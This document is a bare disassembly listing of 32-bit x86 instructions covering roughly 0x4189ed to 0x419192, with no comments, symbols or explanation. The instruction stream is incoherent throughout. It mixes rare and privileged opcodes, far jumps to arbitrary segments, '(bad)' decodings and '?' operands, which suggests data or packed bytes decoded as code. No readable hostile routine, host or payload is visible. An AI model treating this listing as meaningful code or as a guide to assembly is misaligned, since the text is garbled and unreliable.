  4189ed:	sbb    DWORD PTR [esi],ebp
  4189ef:	stos   BYTE PTR es:[edi],al
  4189f0:	icebp  
  4189f1:	cmc    
  4189f2:	int3   
  4189f3:	jl     0x418a02
  4189f5:	jmp    0x5b545c2a
  4189fa:	int3   
  4189fb:	sti    
  4189fc:	pop    esp
  4189fd:	xchg   ebp,eax
  4189ff:	pop    DWORD PTR [edi+0x7e63976]
  418a05:	mov    cl,0x70
  418a07:	mov    al,0xbb
  418a09:	icebp  
  418a0a:	ds push ebp
  418a0c:	sub    eax,0x4a164332
  418a11:	repnz pop ss
  418a13:	sar    DWORD PTR [ebp+0x1e],1
  418a16:	xor    BYTE PTR [eax-0xb],ch
  418a19:	aam    0x55
  418a1b:	retf   0xd9ea
  418a1e:	jns    0x4189d1
  418a20:	adc    DWORD PTR [edi-0x79],0xf
  418a24:	mov    ds:0x15a8693a,al
  418a29:	dec    ebx
  418a2a:	outs   dx,BYTE PTR ds:[esi]
  418a2b:	mov    edx,0x18417b74
  418a30:	or     eax,0x7f7a5dbd
  418a35:	hlt    
  418a36:	xchg   ecx,eax
  418a37:	jno    0x4189ff
  418a39:	dec    ebp
  418a3a:	mov    al,0x76
  418a3c:	jmp    0x218c:0x7e293cc6
  418a43:	aad    0xec
  418a45:	push   edx
  418a46:	inc    eax
  418a47:	xchg   esi,eax
  418a48:	push   ecx
  418a49:	pop    eax
  418a4a:	sub    ebp,DWORD PTR [edi+0x6e]
  418a4d:	xor    BYTE PTR [esi+0x7f000479],al
  418a53:	pop    ecx
  418a54:	ja     0x418a9b
  418a56:	sbb    al,0xb3
  418a58:	jne    0x418a2a
  418a5a:	mov    cl,BYTE PTR [ebx-0x2e]
  418a5d:	jb     0x418abc
  418a5f:	cmp    al,0x4c
  418a61:	pop    esi
  418a62:	dec    edx
  418a63:	mul    DWORD PTR [edi]
  418a65:	out    dx,eax
  418a66:	dec    edx
  418a67:	inc    esp
  418a68:	add    cl,BYTE PTR [ebp+0x3f22f665]
  418a6e:	xchg   edx,eax
  418a6f:	cmp    BYTE PTR [ebx-0x55],bl
  418a72:	in     eax,dx
  418a73:	or     bl,bh
  418a75:	jge    0x4189fd
  418a77:	xchg   ecx,eax
  418a78:	add    edx,edi
  418a7a:	scas   eax,DWORD PTR es:[edi]
  418a7b:	std    
  418a7c:	ja     0x418a8f
  418a7e:	mov    ch,0xed
  418a80:	out    0xac,al
  418a82:	cmc    
  418a83:	fnstsw WORD PTR [edi-0x6332357f]
  418a89:	cmp    ah,BYTE PTR [ebp-0x4b1e7d0d]
  418a8f:	js     0x418aeb
  418a91:	ficom  DWORD PTR [ebp+esi*2+0x66dbde02]
  418a98:	mov    ds:0xee56a7e5,eax
  418a9d:	fcomp  QWORD PTR [esi+0x5528e40b]
  418aa3:	clc    
  418aa4:	mov    WORD PTR [edx-0x30f945aa],gs
  418aaa:	icebp  
  418aab:	push   edi
  418aac:	adc    al,0xa3
  418aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aaf:	dec    eax
  418ab0:	loope  0x418a64
  418ab2:	mov    bl,BYTE PTR [ecx-0x12]
  418ab5:	xchg   DWORD PTR [ebp+0xa7671c],ebp
  418abb:	call   0x6aeb:0x1e68c146
  418ac2:	stos   DWORD PTR es:[edi],eax
  418ac3:	clc    
  418ac4:	mov    edi,DWORD PTR [edi]
  418ac6:	xchg   ebp,eax
  418ac7:	lock cmc 
  418ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aca:	jb     0x418a75
  418acc:	sbb    al,0xd1
  418ace:	or     bh,dl
  418ad0:	je     0x418a65
  418ad2:	outs   dx,BYTE PTR ds:[esi]
  418ad3:	sbb    BYTE PTR [esi],ch
  418ad5:	inc    eax
  418ad6:	mov    eax,ds:0x175a92ef
  418adb:	repnz or ch,BYTE PTR [ebp+0x7900bbb4]
  418ae2:	push   cs
  418ae3:	sub    eax,0x53efe636
  418ae8:	jnp    0x418aec
  418aea:	sti    
  418aeb:	unpcklps xmm0,XMMWORD PTR [ecx+0x9]
  418aef:	sub    eax,0xe2269b15
  418af4:	out    dx,al
  418af5:	xor    al,0x7c
  418af7:	lods   eax,DWORD PTR ds:[esi]
  418af8:	xchg   esi,eax
  418af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418afa:	out    dx,eax
  418afb:	mov    DWORD PTR [edi],ebx
  418afd:	mov    ah,0xc8
  418aff:	sti    
  418b00:	mov    WORD PTR [ecx-0x14],?
  418b03:	test   DWORD PTR [esi],eax
  418b05:	cli    
  418b06:	and    esp,edi
  418b08:	ins    BYTE PTR es:[edi],dx
  418b09:	mov    eax,0x32ed040b
  418b0e:	or     eax,0x870e33a3
  418b13:	imul   ebp,ebp,0xffffff8f
  418b16:	or     BYTE PTR [ecx-0x32f8840b],al
  418b1c:	add    eax,DWORD PTR [ebp-0x3813a9ef]
  418b22:	dec    eax
  418b23:	sahf   
  418b24:	mov    al,BYTE PTR [edi+0x38d69199]
  418b2a:	loopne 0x418b06
  418b2c:	mov    cl,0x20
  418b2e:	xor    eax,0x6b7d7365
  418b33:	jno    0x418b1d
  418b35:	ins    DWORD PTR es:[edi],dx
  418b36:	ins    DWORD PTR es:[edi],dx
  418b37:	adc    eax,0x9bb52432
  418b3c:	enter  0x7ec2,0xd9
  418b40:	daa    
  418b41:	pmaxub mm3,mm7
  418b44:	(bad)  [ebp+0x54]
  418b47:	or     dl,bh
  418b49:	adc    eax,0x44dc815c
  418b4e:	ror    BYTE PTR [edx],cl
  418b50:	pop    es
  418b51:	sbb    BYTE PTR [edx+eiz*2],0xff
  418b55:	xchg   ebp,eax
  418b56:	cmp    ch,bh
  418b58:	movhps xmm6,QWORD PTR [ebx+0xc]
  418b5c:	ins    DWORD PTR es:[edi],dx
  418b5d:	pop    ss
  418b5e:	popf   
  418b5f:	sti    
  418b60:	jbe    0x418bd2
  418b62:	cli    
  418b63:	jl     0x418b5e
  418b65:	dec    edx
  418b66:	jecxz  0x418b0a
  418b68:	daa    
  418b69:	or     eax,DWORD PTR ds:0x5c00508
  418b6f:	push   esi
  418b70:	lahf   
  418b71:	sbb    al,0xd4
  418b73:	in     eax,dx
  418b74:	fisttp DWORD PTR [esi+0x59951b8e]
  418b7a:	add    DWORD PTR [ebx-0xf],esi
  418b7d:	popf   
  418b7e:	mov    ah,0x48
  418b80:	sub    esi,DWORD PTR [ebx]
  418b82:	fs icebp 
  418b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b85:	mov    ds:0x400b1350,eax
  418b8a:	clc    
  418b8b:	jne    0x418bf8
  418b8d:	ds pop ebp
  418b8f:	sbb    edx,DWORD PTR [ebx]
  418b91:	or     BYTE PTR [edi+edi*2],al
  418b94:	test   DWORD PTR [ebp+0x1a],ebp
  418b97:	jl     0x418bfc
  418b99:	ror    cl,cl
  418b9b:	mov    dl,BYTE PTR [esi-0x4005a862]
  418ba1:	mov    ch,0xb6
  418ba3:	lds    edi,FWORD PTR [edx]
  418ba5:	cmc    
  418ba6:	dec    eax
  418ba7:	and    ebx,DWORD PTR [ecx+edx*2-0x79]
  418bab:	retf   
  418bac:	loopne 0x418b60
  418bae:	out    dx,al
  418baf:	cdq    
  418bb0:	dec    esp
  418bb1:	adc    eax,0x4b463453
  418bb6:	int    0xc2
  418bb8:	cs mov esp,0xcd9f46aa
  418bbe:	ja     0x418bdc
  418bc0:	push   cs
  418bc1:	mov    ds:0x86d7a006,al
  418bc6:	icebp  
  418bc7:	adc    ah,0x58
  418bca:	and    BYTE PTR [esi],ch
  418bcc:	push   edx
  418bcd:	mov    ebx,0x1e51c941
  418bd2:	ins    BYTE PTR es:[edi],dx
  418bd3:	xor    al,0x48
  418bd5:	sbb    al,0xb2
  418bd7:	fstp   DWORD PTR [ecx+eiz*1]
  418bda:	ins    BYTE PTR es:[edi],dx
  418bdb:	pop    es
  418bdc:	sti    
  418bdd:	sar    BYTE PTR [esi-0x67f73896],1
  418be3:	fbstp  TBYTE PTR [esi-0x3a]
  418be6:	xchg   DWORD PTR [ebp+edi*8+0x2],ecx
  418bea:	fdivr  QWORD PTR [ebp+0x1aa1a5e7]
  418bf0:	fdivr  DWORD PTR [edi]
  418bf2:	inc    eax
  418bf3:	test   BYTE PTR [esi+0x4458b6be],0xda
  418bfa:	push   eax
  418bfb:	sub    al,0xd9
  418bfd:	jne    0x418bb1
  418bff:	xchg   edx,eax
  418c00:	fst    DWORD PTR [eax]
  418c02:	imul   ebx,esp,0x191b31c2
  418c08:	push   edi
  418c09:	loop   0x418c34
  418c0b:	inc    ebp
  418c0c:	clc    
  418c0d:	fdivr  DWORD PTR [esi]
  418c0f:	pop    es
  418c10:	aad    0xb2
  418c12:	xor    esi,eax
  418c14:	jo     0x418ba3
  418c16:	call   0x263ddc71
  418c1b:	add    al,0x65
  418c1d:	in     eax,dx
  418c1e:	jg     0x418c94
  418c20:	add    al,0x52
  418c22:	daa    
  418c23:	and    edx,ebx
  418c25:	arpl   WORD PTR [edx],bp
  418c27:	in     eax,dx
  418c28:	xor    al,0xd9
  418c2a:	icebp  
  418c2b:	(bad)  
  418c2d:	push   edi
  418c2e:	pop    es
  418c2f:	sub    al,0x39
  418c31:	imul   edi,DWORD PTR [ebx],0x412ebeef
  418c37:	jno    0x418cb7
  418c39:	mov    ebx,0xb86e3255
  418c3e:	push   eax
  418c3f:	jl     0x418c9e
  418c41:	out    0x9e,al
  418c43:	dec    ecx
  418c44:	ins    DWORD PTR es:[edi],dx
  418c45:	cmp    DWORD PTR [ecx+0x22],0xffffff8e
  418c49:	(bad)  
  418c4a:	lock stc 
  418c4c:	push   si
  418c4e:	lods   eax,DWORD PTR ds:[esi]
  418c4f:	pop    edx
  418c50:	fisubr DWORD PTR [esi]
  418c52:	test   DWORD PTR [ebx+0x6c488788],0x6d0b7137
  418c5c:	cs inc ecx
  418c5e:	mov    dl,0x60
  418c60:	mov    al,0x80
  418c62:	scas   eax,DWORD PTR es:[edi]
  418c63:	inc    ebp
  418c64:	add    eax,0xfc2cfc72
  418c69:	mov    ds:0x90dcd10b,eax
  418c6e:	add    ah,BYTE PTR [ebx+0x31dd0357]
  418c74:	jl     0x418c7f
  418c76:	cmc    
  418c77:	lods   eax,DWORD PTR ds:[esi]
  418c78:	ja     0x418c12
  418c7a:	mov    ebp,0xccb21051
  418c7f:	jmp    0xc581:0x751b9862
  418c86:	out    dx,al
  418c87:	imul   ebx,DWORD PTR [edx-0x9],0x22
  418c8b:	sub    eax,0x87aa054
  418c90:	cmp    DWORD PTR [esi],ecx
  418c92:	pop    es
  418c93:	leave  
  418c94:	mov    DWORD PTR [edi+ebx*1+0x4d],eax
  418c98:	fistp  WORD PTR [edx-0x6d]
  418c9b:	or     DWORD PTR [edi+0x750562b],edi
  418ca1:	fdiv   st(2),st
  418ca3:	xchg   ebp,eax
  418ca4:	or     DWORD PTR [ebx-0x42],ebx
  418ca7:	cwde   
  418ca8:	mov    edi,0xa01b319b
  418cad:	sub    edi,DWORD PTR [ecx]
  418caf:	aas    
  418cb0:	ffree  st(6)
  418cb2:	jp     0x418c44
  418cb4:	stos   DWORD PTR es:[edi],eax
  418cb5:	or     eax,0x947b3f02
  418cba:	sbb    al,BYTE PTR [edx+0x5da8fa91]
  418cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cc2:	mov    dh,0xbd
  418cc4:	and    esi,0x37d4e962
  418cca:	jg     0x418c96
  418ccc:	aad    0x53
  418cce:	scas   eax,DWORD PTR es:[edi]
  418ccf:	dec    esi
  418cd0:	jo     0x418c57
  418cd2:	cmp    al,0xa8
  418cd4:	push   ds
  418cd5:	stos   DWORD PTR es:[edi],eax
  418cd6:	retf   
  418cd7:	cdq    
  418cd8:	adc    edx,DWORD PTR [edx]
  418cda:	outs   dx,BYTE PTR ds:[esi]
  418cdb:	loop   0x418d02
  418cdd:	fistp  DWORD PTR [ebx]
  418cdf:	fld    DWORD PTR [edi-0x195ff4a9]
  418ce5:	jmp    0x9e5b3dad
  418cea:	xchg   ecx,ebx
  418cec:	mov    ebx,DWORD PTR [esi-0x323c5d4d]
  418cf2:	xor    bh,ah
  418cf4:	xchg   esp,eax
  418cf5:	mov    bp,0xc2dc
  418cf9:	or     eax,0x2bd80f4
  418cfe:	fcomp  DWORD PTR [ecx-0x3e]
  418d01:	call   ecx
  418d03:	mov    eax,ds:0x11f16f22
  418d08:	imul   esi,ebx,0x19
  418d0b:	xchg   edi,edx
  418d0d:	mov    DWORD PTR [edi+eiz*4+0x3b3299b2],ebx
  418d14:	pop    eax
  418d15:	xchg   ebx,eax
  418d16:	xlat   BYTE PTR ds:[ebx]
  418d17:	aas    
  418d18:	pop    edi
  418d19:	rol    bl,cl
  418d1b:	xchg   bp,ax
  418d1d:	add    eax,0xb362df02
  418d22:	call   0x57ea:0x1024f94e
  418d29:	jmp    0x418d30
  418d2b:	pop    ds
  418d2c:	or     al,cl
  418d2e:	das    
  418d2f:	js     0x418cb3
  418d31:	mov    ch,0x3f
  418d33:	cmp    DWORD PTR [ecx-0x69f75850],ebp
  418d39:	outs   dx,BYTE PTR ds:[esi]
  418d3a:	or     eax,0xb3b4e4da
  418d3f:	mov    edx,0xa28cd253
  418d44:	stos   BYTE PTR es:[edi],al
  418d45:	xor    al,0xb2
  418d47:	xchg   edx,eax
  418d48:	fsubr  DWORD PTR [eax-0x4e125d03]
  418d4e:	jae    0x418d9f
  418d50:	hlt    
  418d51:	mov    dh,0xad
  418d53:	jns    0x418d21
  418d55:	fstp   st(2)
  418d57:	xchg   BYTE PTR [edi+0x10],ah
  418d5a:	hlt    
  418d5b:	jle    0x418d11
  418d5d:	aaa    
  418d5e:	idiv   bl
  418d60:	leave  
  418d61:	fs mov esi,0xe6717529
  418d67:	retf   
  418d68:	shl    edi,1
  418d6a:	bound  esp,QWORD PTR [edx-0x5ffce2aa]
  418d70:	daa    
  418d71:	xchg   edx,eax
  418d72:	nop
  418d73:	pop    eax
  418d74:	es add al,0x14
  418d77:	push   edx
  418d78:	sti    
  418d79:	sbb    ebx,DWORD PTR [ebp-0x32]
  418d7c:	add    al,0x41
  418d7e:	or     al,0xdd
  418d80:	sub    BYTE PTR [esi+esi*8],dl
  418d83:	data16 mov al,0x55
  418d86:	and    bl,bl
  418d88:	dec    esi
  418d89:	xchg   ecx,eax
  418d8a:	pop    es
  418d8b:	addr16 push 0x27a567e0
  418d91:	cmp    esi,DWORD PTR ds:0x124a8ad5
  418d97:	fistp  QWORD PTR [esp+ebp*4+0x7e317d80]
  418d9e:	retf   0x188a
  418da1:	jmp    0xb239:0xf6003b00
  418da8:	rcl    dh,1
  418daa:	and    dh,dl
  418dac:	mov    ebp,esi
  418dae:	xchg   ebx,eax
  418daf:	xchg   edx,eax
  418db0:	add    dl,BYTE PTR [eax-0x5b]
  418db3:	aas    
  418db4:	mov    ds:0xffc1e2a,al
  418db9:	neg    DWORD PTR [edi+edi*4-0x9b075d9]
  418dc0:	outs   dx,DWORD PTR ds:[esi]
  418dc1:	inc    ebp
  418dc2:	stc    
  418dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc4:	xor    BYTE PTR [eax-0x1e],cl
  418dc7:	popf   
  418dc8:	enter  0xbc96,0xab
  418dcc:	pusha  
  418dcd:	jne    0x418e41
  418dcf:	mov    WORD PTR [ebx],gs
  418dd1:	push   ss
  418dd2:	int3   
  418dd3:	cmc    
  418dd4:	test   DWORD PTR [ebx],0x9539dd9e
  418dda:	and    BYTE PTR [ebx-0x67a64aed],cl
  418de0:	and    DWORD PTR [esi-0x20a9898e],eax
  418de6:	ret    
  418de7:	inc    edx
  418de8:	xor    BYTE PTR [ecx-0x674f5377],al
  418dee:	jg     0x418d86
  418df0:	mov    dh,0xaf
  418df3:	xchg   BYTE PTR [edx+0x5f],bl
  418df6:	cmp    BYTE PTR [edx+0x66],dh
  418df9:	lahf   
  418dfa:	push   ss
  418dfb:	inc    edi
  418dfc:	data16 sahf 
  418dfe:	ret    
  418dff:	adc    DWORD PTR [ebx+0x4a398bd],eax
  418e05:	sub    ebp,0xffffffc5
  418e08:	popa   
  418e09:	add    esi,DWORD PTR [esi+0x32]
  418e0c:	inc    edx
  418e0d:	ja     0x418e28
  418e0f:	lods   al,BYTE PTR ds:[esi]
  418e10:	test   DWORD PTR [esi+0x2bbe1a92],ebx
  418e16:	rcr    esp,cl
  418e18:	loop   0x418d9e
  418e1a:	jae    0x418e71
  418e1c:	bound  esi,QWORD PTR ds:[ecx+0xf3e4fef]
  418e23:	mov    WORD PTR [esi],?
  418e25:	clc    
  418e26:	call   0xe4458bc7
  418e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e2c:	jl     0x418e91
  418e2e:	jg     0x418e04
  418e30:	fsubr  st,st(6)
  418e32:	pop    ebp
  418e33:	pop    esp
  418e34:	jno    0x418e93
  418e36:	fmul   QWORD PTR [ebx]
  418e38:	inc    esp
  418e39:	sti    
  418e3a:	inc    esp
  418e3b:	mov    bh,0x2f
  418e3d:	sti    
  418e3e:	int3   
  418e3f:	dec    edx
  418e40:	ss push cs
  418e42:	push   ds
  418e43:	icebp  
  418e44:	in     al,dx
  418e45:	add    eax,DWORD PTR [esi]
  418e47:	push   eax
  418e48:	cli    
  418e49:	mov    ds:0xb2aae51e,eax
  418e4e:	icebp  
  418e4f:	rcl    BYTE PTR [edx],1
  418e51:	push   es
  418e52:	fisubr DWORD PTR [ebx+0x7a2c9641]
  418e58:	xchg   esp,eax
  418e59:	xor    esi,ebx
  418e5b:	pop    esp
  418e5c:	sub    edi,DWORD PTR [esi-0x5]
  418e5f:	retf   
  418e60:	sub    al,0x4f
  418e62:	out    0x8,al
  418e64:	js     0x418e03
  418e66:	popf   
  418e67:	pushf  
  418e68:	fisub  WORD PTR [ecx-0x39]
  418e6b:	inc    edi
  418e6c:	jmp    0xf177:0xe3be65ad
  418e73:	sub    bl,0x52
  418e76:	ins    DWORD PTR es:[edi],dx
  418e77:	sbb    al,0x1a
  418e79:	push   ebx
  418e7a:	sbb    al,dl
  418e7c:	adc    DWORD PTR [edi+ecx*1-0x250337c1],eax
  418e83:	mov    ?,ecx
  418e85:	mov    DWORD PTR [ecx+0x1bd21b14],ebp
  418e8b:	shr    BYTE PTR [ebp-0x1184053f],1
  418e91:	cli    
  418e92:	imul   edx,ecx,0x1b
  418e95:	sbb    eax,0x87ebc956
  418e9a:	xor    BYTE PTR ds:0xeb4f3715,ah
  418ea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ea1:	add    BYTE PTR [edx-0x5c424dce],bh
  418ea7:	xchg   esp,eax
  418ea8:	fistp  DWORD PTR [ebx-0x26397720]
  418eae:	xor    DWORD PTR [ebx-0x2f7dbc36],0xb909ebef
  418eb8:	inc    ecx
  418eb9:	ds in  al,0xa6
  418ebc:	sbb    eax,0x132e24bb
  418ec1:	xor    dl,BYTE PTR [ebx]
  418ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ec4:	(bad)  
  418ec6:	test   al,0x74
  418ec8:	call   0x43b1:0xef33981
  418ecf:	pop    ecx
  418ed0:	push   edx
  418ed1:	cld    
  418ed2:	mov    al,ds:0x79348343
  418ed7:	repz clc 
  418ed9:	test   DWORD PTR [ebx],0xe7871252
  418edf:	push   eax
  418ee0:	lds    ecx,FWORD PTR [edx]
  418ee2:	scas   eax,DWORD PTR es:[edi]
  418ee3:	xchg   ecx,eax
  418ee4:	push   es
  418ee5:	sbb    BYTE PTR [esi],0x51
  418ee8:	sbb    edi,DWORD PTR [edx]
  418eea:	pop    ss
  418eeb:	test   DWORD PTR [ecx-0x792fc1cc],edx
  418ef1:	jbe    0x418ece
  418ef3:	dec    esi
  418ef4:	sbb    eax,0x3fedda40
  418ef9:	lods   al,BYTE PTR ds:[esi]
  418efa:	sub    ah,dh
  418efc:	jb     0x418eaa
  418efe:	pop    esi
  418eff:	inc    edi
  418f00:	pop    ebx
  418f01:	imul   edi,DWORD PTR [eax-0x26d09568],0xffffffe8
  418f08:	ret    
  418f09:	int3   
  418f0a:	push   ss
  418f0b:	mov    ecx,0xcbf897b2
  418f10:	jmp    0x4d85:0xff210c95
  418f17:	(bad)  
  418f18:	imul   eax,DWORD PTR [ebx],0xffffffcb
  418f1b:	rcr    DWORD PTR [edi-0xf886148],0x64
  418f22:	add    ah,BYTE PTR [ebx-0x23001dd3]
  418f28:	(bad)  
  418f29:	cmp    cl,dh
  418f2b:	and    BYTE PTR [esp+ecx*4-0x1f],bh
  418f2f:	sbb    al,0xe3
  418f31:	and    ebx,eax
  418f33:	test   DWORD PTR [ebp+ebx*8+0xd],ebp
  418f37:	je     0x418ebf
  418f39:	xor    eax,DWORD PTR [edx-0x60]
  418f3c:	sbb    dl,dh
  418f3e:	xchg   ebx,eax
  418f3f:	and    BYTE PTR [esi+ebp*4],al
  418f42:	test   DWORD PTR [edi],edx
  418f44:	push   es
  418f45:	mov    ds:0x5d05b6d5,eax
  418f4a:	call   0xacec:0xb19794a9
  418f51:	xchg   ebx,eax
  418f52:	leave  
  418f53:	adc    ebp,DWORD PTR [ebp+0x73]
  418f56:	and    esi,DWORD PTR [esi+0x22]
  418f59:	jb     0x418f41
  418f5b:	pop    ecx
  418f5c:	fdiv   QWORD PTR [edx]
  418f5e:	popf   
  418f5f:	push   ebp
  418f60:	jl     0x418f54
  418f62:	add    BYTE PTR [edi+0x49],bh
  418f65:	dec    ebx
  418f66:	cmp    al,0x9e
  418f68:	push   edx
  418f69:	test   al,0xe4
  418f6b:	add    dh,BYTE PTR [esi]
  418f6d:	dec    ebx
  418f6e:	jle    0x418f83
  418f70:	sub    eax,0xcb50fda9
  418f75:	sar    BYTE PTR [ebp+0x1],0x2a
  418f79:	xor    al,0x1a
  418f7b:	stos   DWORD PTR es:[edi],eax
  418f7c:	inc    ecx
  418f7d:	add    DWORD PTR [edi*2-0x7825c250],ebp
  418f84:	pop    ebx
  418f85:	xchg   ecx,eax
  418f86:	gs xchg esp,eax
  418f88:	xchg   BYTE PTR [esi+0x76],al
  418f8b:	mov    edx,0x44ecf1aa
  418f90:	mov    edi,DWORD PTR [eax]
  418f92:	jle    0x418fb2
  418f94:	cli    
  418f95:	cmp    esi,DWORD PTR [edi+0x558fa69]
  418f9b:	xor    DWORD PTR [eax+0x5b],esp
  418f9e:	mov    dh,0xd1
  418fa0:	mov    cl,0x95
  418fa2:	jne    0x418f3e
  418fa4:	enter  0xa92,0xa1
  418fa8:	dec    ebp
  418fa9:	push   esp
  418faa:	mov    edx,0x9cf78e2
  418faf:	daa    
  418fb0:	icebp  
  418fb1:	(bad)  
  418fb3:	cmp    BYTE PTR [bx+0x39],al
  418fb7:	retf   0x5154
  418fba:	cmp    DWORD PTR [ecx-0x7205578e],ecx
  418fc0:	and    ecx,ecx
  418fc2:	daa    
  418fc3:	cmp    DWORD PTR [edx-0x26],0x7a
  418fc7:	scas   eax,DWORD PTR es:[edi]
  418fc8:	xchg   ebx,eax
  418fc9:	push   edx
  418fca:	ror    BYTE PTR [ebp+0x2f3f9201],0x98
  418fd1:	ins    DWORD PTR es:[edi],dx
  418fd2:	icebp  
  418fd3:	fisub  DWORD PTR [edx]
  418fd5:	mov    edi,0xf82e579e
  418fda:	fs shr esp,0x46
  418fde:	cmc    
  418fdf:	outs   dx,BYTE PTR ds:[esi]
  418fe0:	push   es
  418fe1:	mov    ds:0x43d175c,eax
  418fe6:	xchg   edi,eax
  418fe7:	fsubp  st(5),st
  418fe9:	xchg   ebx,eax
  418fea:	aad    0x5a
  418fec:	sub    DWORD PTR [esi+ebx*1-0x4f],0x3b
  418ff1:	ficom  WORD PTR [ecx+ecx*8-0x6b]
  418ff5:	outs   dx,DWORD PTR ds:[esi]
  418ff6:	mov    ds:0x7d47a99e,eax
  418ffb:	iret   
  418ffc:	push   cs
  418ffd:	xchg   BYTE PTR [esi-0x30],bl
  419000:	pop    esi
  419001:	mov    bh,0x4b
  419003:	in     al,dx
  419004:	in     al,0x2d
  419006:	stos   BYTE PTR es:[edi],al
  419007:	loope  0x419016
  419009:	nop
  41900a:	add    esi,DWORD PTR [edi+0x3c51633]
  419010:	ja     0x41901c
  419012:	rdtsc  
  419014:	loop   0x419004
  419016:	adc    esp,DWORD PTR cs:[eax+esi*4+0x87e019e]
  41901e:	jb     0x419098
  419020:	fist   DWORD PTR [ebx]
  419022:	mov    BYTE PTR [ebp-0x3b],al
  419025:	neg    DWORD PTR [esi+esi*4]
  419028:	jb     0x419044
  41902a:	pop    edx
  41902b:	dec    eax
  41902c:	jge    0x419005
  41902e:	cwde   
  41902f:	dec    ebx
  419030:	pop    es
  419031:	outs   dx,DWORD PTR gs:[esi]
  419033:	xchg   edx,eax
  419034:	or     BYTE PTR ds:0xfdd9f5fc,0x6b
  41903b:	imul   ecx,edx,0xa02dcca3
  419041:	outs   dx,BYTE PTR ds:[esi]
  419042:	xor    BYTE PTR [esp+edi*4-0x2a],0x19
  419047:	mov    eax,0x6a15c6fe
  41904c:	fs nop
  41904e:	or     ebp,edx
  419050:	jge    0x419046
  419052:	fmul   QWORD PTR [esp+esi*8]
  419055:	push   ss
  419056:	mov    edi,0x1b0a7499
  41905b:	inc    ebx
  41905c:	sub    DWORD PTR gs:[esi-0xa],edi
  419060:	in     eax,dx
  419061:	mov    BYTE PTR [ebx+0x3],al
  419064:	aad    0x4c
  419066:	aaa    
  419067:	aam    0x3d
  419069:	out    0x95,al
  41906b:	test   DWORD PTR [ecx],0xb83f3427
  419071:	add    DWORD PTR [esi-0x68307df0],ecx
  419077:	ret    0x7899
  41907a:	push   0x19
  41907c:	xchg   esp,eax
  41907d:	cmp    al,0x78
  41907f:	dec    edi
  419080:	mov    ds:0x51f96e9e,eax
  419085:	fabs   
  419087:	fcomp  DWORD PTR [edi]
  419089:	fucom  st(1)
  41908b:	jb     0x4190b3
  41908d:	jo     0x419036
  41908f:	dec    eax
  419090:	ds ret 0xd0ce
  419094:	test   al,0x0
  419096:	xchg   BYTE PTR [ecx-0x4ed7e374],cl
  41909c:	mov    al,0xf1
  41909e:	mov    ds:0x873ac320,al
  4190a3:	retf   0x7f49
  4190a6:	and    ebx,DWORD PTR [eax-0x78]
  4190a9:	inc    edi
  4190aa:	jmp    0xff34648e
  4190af:	loope  0x419037
  4190b1:	mov    esp,0x17627709
  4190b6:	loope  0x4190bf
  4190b8:	bound  edi,QWORD PTR [ecx+0x6e]
  4190bb:	inc    eax
  4190bc:	fist   WORD PTR [edx]
  4190be:	(bad)  
  4190bf:	sub    ch,BYTE PTR [edi-0x9]
  4190c2:	jno    0x4190a0
  4190c4:	push   ds
  4190c5:	push   ss
  4190c6:	sti    
  4190c7:	sub    ah,ah
  4190c9:	shl    bl,cl
  4190cb:	gs fdiv DWORD PTR cs:[esi]
  4190cf:	cmp    BYTE PTR [esi-0x10],al
  4190d2:	lods   eax,DWORD PTR ds:[esi]
  4190d3:	dec    ecx
  4190d4:	lods   al,BYTE PTR ds:[esi]
  4190d5:	jmp    0x84098a2b
  4190da:	push   ebx
  4190db:	jne    0x419126
  4190dd:	jmp    0x41911e
  4190df:	lods   eax,DWORD PTR ds:[esi]
  4190e0:	test   eax,0xa3540d77
  4190e5:	push   ebp
  4190e6:	mov    eax,ds:0xb5b21450
  4190eb:	mov    ecx,ecx
  4190ed:	pop    es
  4190ee:	or     BYTE PTR [eax+0x23],ah
  4190f1:	repz and dh,ch
  4190f4:	mov    ds:0xe91b65b2,al
  4190f9:	inc    esi
  4190fa:	mov    dh,0x8d
  4190fc:	mov    ds:0x1da10090,al
  419101:	mov    WORD PTR [eax*2+0x62d8159a],cs
  419108:	test   edx,edx
  41910a:	cmp    al,0x5a
  41910c:	mov    bl,0xd3
  41910e:	loop   0x4190ff
  419110:	ins    BYTE PTR es:[edi],dx
  419111:	or     BYTE PTR [edx],0xc2
  419114:	inc    eax
  419115:	jns    0x41914b
  419117:	rcr    DWORD PTR [edx+0x26144c7b],cl
  41911d:	pop    edi
  41911e:	and    dh,BYTE PTR [ecx+0xa]
  419121:	loopne 0x41913f
  419123:	mov    esp,0xf77c82c2
  419128:	cld    
  419129:	hlt    
  41912a:	jecxz  0x4191ab
  41912c:	fs dec esp
  41912e:	loope  0x41912f
  419130:	xor    al,0x6b
  419132:	mov    ebx,0x11c3d0f0
  419137:	jle    0x419148
  419139:	hlt    
  41913a:	dec    edi
  41913b:	add    esi,DWORD PTR [ebx+ebp*2-0x8]
  41913f:	ds sti 
  419141:	shl    DWORD PTR [esi+0x39],cl
  419144:	push   edi
  419145:	dec    edx
  419146:	call   0xebbf:0x38bda249
  41914d:	and    ecx,DWORD PTR [edi-0x7c]
  419150:	leave  
  419151:	hlt    
  419152:	jmp    0x7b01:0x3034da78
  419159:	int3   
  41915a:	sub    edx,DWORD PTR [ecx-0x6091bb4d]
  419160:	jbe    0x41910c
  419162:	inc    ebx
  419163:	ficomp DWORD PTR [edx-0x7]
  419166:	or     DWORD PTR [esi*4+0x31210dc0],0xffffffc9
  41916e:	inc    edi
  41916f:	cmp    BYTE PTR [ebx],bl
  419171:	scas   eax,DWORD PTR es:[edi]
  419172:	cmp    BYTE PTR [edi],ah
  419174:	int    0x9
  419176:	sbb    dl,BYTE PTR [ebx+0x7ee9421b]
  41917c:	xlat   BYTE PTR ds:[ebx]
  41917d:	mov    edi,0x7898a4d
  419182:	pop    edx
  419183:	mov    al,0x2c
  419185:	(bad)  
  419186:	pop    esi
  419187:	adc    al,0xb2
  419189:	sub    bl,BYTE PTR [esi]
  41918b:	jge    0x419134
  41918d:	jmp    0x7aff881d
  419192:	and    eax,0x7536ac6d
